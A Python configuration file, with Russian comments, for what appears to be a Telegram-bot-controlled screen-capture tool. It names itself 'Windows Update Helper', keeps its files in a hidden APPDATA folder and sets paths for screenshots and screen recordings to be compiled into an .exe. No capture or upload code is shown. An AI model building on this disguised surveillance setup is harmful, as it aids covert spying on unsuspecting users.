import os


class Config:
    def __init__(self):
        self.app_name = "Windows Update Helper"
        self.temp_path = os.path.join(os.getenv('APPDATA'), self.app_name, "temp_path")

        self.TELEGRAM_API = "your bot API here"

        self.encrypted_ids_file = os.path.join(self.temp_path, "localdata.txt")
        self.ENCRYPTION_KEY = self.TELEGRAM_API.split(":")[1]

        self.screen_path = os.path.join(self.temp_path, 'screen.png')
        self.video_filename = os.path.join(self.temp_path, "screen_record.mp4")
        self.fps = 15
        self.duration = 5

    def create_temp_path(self):
        if not os.path.exists(self.temp_path):
            os.makedirs(self.temp_path, exist_ok=True)


# Этот файл сделан для того чтобы удобно ввести настройки программы не влезая в код
# Так же он используется как встроенная библиотека чтобы компилятор засунул эти данные в .exe шник